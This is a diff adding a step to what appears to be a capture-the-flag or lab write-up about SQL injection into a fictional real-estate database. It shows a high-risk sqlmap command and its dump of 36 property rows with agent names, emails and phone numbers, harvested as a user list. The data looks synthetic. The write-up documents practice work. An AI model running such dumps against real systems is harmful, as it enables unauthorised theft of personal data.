@@ -189,5 +189,55 @@ Database: NorthStoneDB
 There is nothing inside the `auth_test_users` table
 
 ```python
+sqlmap -r request.txt --level=4 --risk=3 --dbs --flush-session --batch -D NorthStoneDB -T Properties --dump
 
+[17:49:56] [INFO] fetching columns for table 'Properties' in database 'NorthStoneDB'
+[17:49:56] [INFO] fetching entries for table 'Properties' in database 'NorthStoneDB'
+Database: NorthStoneDB
+Table: Properties
+[36 entries]
++----+------------+-----------------------------------+-----------------+-----------------+----------------------------------+-----------------+
+| ID | Price      | Name                              | Location        | AgentName       | AgentEmail                       | AgentPhone      |
++----+------------+-----------------------------------+-----------------+-----------------+----------------------------------+-----------------+
+| 1  | $1,150,000 | Upper East Side Apartment         | New York, NY    | Chris Walker    | chris.walker@northstone.local    | +1-212-555-1001 |
+| 2  | $1,850,000 | SoHo Loft                         | New York, NY    | Alex Morgan     | alex.morgan@northstone.local     | +1-212-555-1002 |
+| 3  | $980,000   | Brooklyn Heights Condo            | New York, NY    | Sophia Blake    | sophia.blake@northstone.local    | +1-212-555-1003 |
+| 4  | $2,400,000 | Manhattan Central Park View       | New York, NY    | Daniel Reed     | daniel.reed@northstone.local     | +1-212-555-1004 |
+| 5  | $820,000   | Financial District Studio         | New York, NY    | Emma Collins    | emma.collins@northstone.local    | +1-212-555-1005 |
+| 6  | $2,900,000 | Tribeca Luxury Apartment          | New York, NY    | Michael Stone   | michael.stone@northstone.local   | +1-212-555-1006 |
+| 7  | $3,500,000 | Beverly Hills Residence           | Los Angeles, CA | Emily Stone     | emily.stone@northstone.local     | +1-310-555-2001 |
+| 8  | $2,700,000 | Hollywood Hills Modern Home       | Los Angeles, CA | Ryan Cooper     | ryan.cooper@northstone.local     | +1-310-555-2002 |
+| 9  | $1,600,000 | Santa Monica Beach Condo          | Los Angeles, CA | Megan Fox       | megan.fox@northstone.local       | +1-310-555-2003 |
+| 10 | $2,200,000 | Downtown LA Penthouse             | Los Angeles, CA | Liam Scott      | liam.scott@northstone.local      | +1-310-555-2004 |
+| 11 | $1,900,000 | Venice Canal House                | Los Angeles, CA | Olivia Brown    | olivia.brown@northstone.local    | +1-310-555-2005 |
+| 12 | $1,250,000 | Westwood Family Home              | Los Angeles, CA | Noah Wilson     | noah.wilson@northstone.local     | +1-310-555-2006 |
+| 13 | $1,300,000 | Miami Beach Ocean Apartment       | Miami, FL       | Carlos Diaz     | carlos.diaz@northstone.local     | +1-305-555-3001 |
+| 14 | $1,100,000 | Brickell Financial District Condo | Miami, FL       | Isabella Cruz   | isabella.cruz@northstone.local   | +1-305-555-3002 |
+| 15 | $920,000   | Downtown Miami Loft               | Miami, FL       | Mateo Alvarez   | mateo.alvarez@northstone.local   | +1-305-555-3003 |
+| 16 | $1,700,000 | Coral Gables Residence            | Miami, FL       | Sofia Martinez  | sofia.martinez@northstone.local  | +1-305-555-3004 |
+| 17 | $2,100,000 | Sunny Isles Luxury Apartment      | Miami, FL       | Lucas Fernandez | lucas.fernandez@northstone.local | +1-305-555-3005 |
+| 18 | $1,250,000 | Edgewater Bay Condo               | Miami, FL       | Valentina Perez | valentina.perez@northstone.local | +1-305-555-3006 |
+| 19 | $780,000   | Downtown Chicago Condo            | Chicago, IL     | Sophia Reed     | sophia.reed@northstone.local     | +1-312-555-4001 |
+| 20 | $920,000   | River North Apartment             | Chicago, IL     | Liam Scott      | liam.scott@northstone.local      | +1-312-555-4002 |
+| 21 | $1,400,000 | Gold Coast Luxury Condo           | Chicago, IL     | Emma Watson     | emma.watson@northstone.local     | +1-312-555-4003 |
+| 22 | $1,150,000 | Lincoln Park Townhouse            | Chicago, IL     | Jacob Miller    | jacob.miller@northstone.local    | +1-312-555-4004 |
+| 23 | $870,000   | Lakeview Modern Apartment         | Chicago, IL     | Ava Johnson     | ava.johnson@northstone.local     | +1-312-555-4005 |
+| 24 | $1,900,000 | West Loop Penthouse               | Chicago, IL     | Ethan Brown     | ethan.brown@northstone.local     | +1-312-555-4006 |
+| 25 | $4,500,000 | Luxury Oceanfront Villa           | Miami, FL       | Daniel Carter   | daniel.carter@northstone.local   | +1-305-555-5001 |
+| 26 | $5,200,000 | Beverly Hills Private Villa       | Los Angeles, CA | Megan Fox       | megan.fox@northstone.local       | +1-310-555-5002 |
+| 27 | $3,800,000 | Hamptons Style Villa              | New York, NY    | Chris Walker    | chris.walker@northstone.local    | +1-212-555-5003 |
+| 28 | $4,200,000 | Modern Hillside Villa             | Los Angeles, CA | Ryan Cooper     | ryan.cooper@northstone.local     | +1-310-555-5004 |
+| 29 | $3,600,000 | Mediterranean Estate Villa        | Miami, FL       | Carlos Diaz     | carlos.diaz@northstone.local     | +1-305-555-5005 |
+| 30 | $4,900,000 | Contemporary Glass Villa          | Chicago, IL     | Sophia Reed     | sophia.reed@northstone.local     | +1-312-555-5006 |
+| 31 | $2,400,000 | Oceanfront Beach House            | Miami, FL       | Lucas Fernandez | lucas.fernandez@northstone.local | +1-305-555-6001 |
+| 32 | $2,900,000 | Santa Monica Beach House          | Los Angeles, CA | Olivia Brown    | olivia.brown@northstone.local    | +1-310-555-6002 |
+| 33 | $3,700,000 | Malibu Cliffside Beach House      | Los Angeles, CA | Noah Wilson     | noah.wilson@northstone.local     | +1-310-555-6003 |
+| 34 | $2,100,000 | Miami Sunset Beach House          | Miami, FL       | Valentina Perez | valentina.perez@northstone.local | +1-305-555-6004 |
+| 35 | $3,200,000 | Luxury Private Beach Residence    | Miami, FL       | Mateo Alvarez   | mateo.alvarez@northstone.local   | +1-305-555-6005 |
+| 36 | $3,500,000 | Exclusive Coastal Beach House     | Los Angeles, CA | Emily Stone     | emily.stone@northstone.local     | +1-310-555-6006 |
++----+------------+-----------------------------------+-----------------+-----------------+----------------------------------+-----------------+
 ```
+
+Ive found some users!
+
+Ill place these into a file
